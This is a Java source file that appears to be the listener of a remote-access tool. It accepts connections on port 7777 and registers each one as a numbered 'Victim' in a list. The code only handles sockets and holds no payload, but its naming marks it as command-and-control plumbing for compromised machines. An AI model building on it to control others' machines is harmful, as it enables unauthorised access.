package server;

import server.model.Victim;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

public class Connection extends Thread {

    public static final int port = 7777;
    private ServerSocket serverSocket;
    private List<Victim> victimList;

    public Connection() throws IOException {
        serverSocket = new ServerSocket(Connection.port);
        victimList = new ArrayList();
    }

    public int getVictimNums(){
        return this.victimList.size();
    }

    public boolean removeVictim(Victim victim){
        return victimList.remove(victim);
    }

    public String getVictimAnonymousName(){
        return "Victim_" + (victimList.size() + 1);
    }

    public List<Victim> getVictimList() {
        return victimList;
    }

    @Override
    public void run() {
        while (true)
        {
            //System.out.println("Server waiting...");
            try {
                Socket socket = serverSocket.accept();
                Victim victim = new Victim(getVictimAnonymousName(), socket);
                victimList.add(victim);
               // System.out.println("Size : " + victimList.size());
                Thread.sleep(5000);
            } catch (Exception e) {
                e.printStackTrace();
                try {
                    Thread.sleep(5000);
                } catch (InterruptedException interruptedException) {
                    interruptedException.printStackTrace();
                }
            }
            //System.out.println("Connected client...");
        }
    }
}

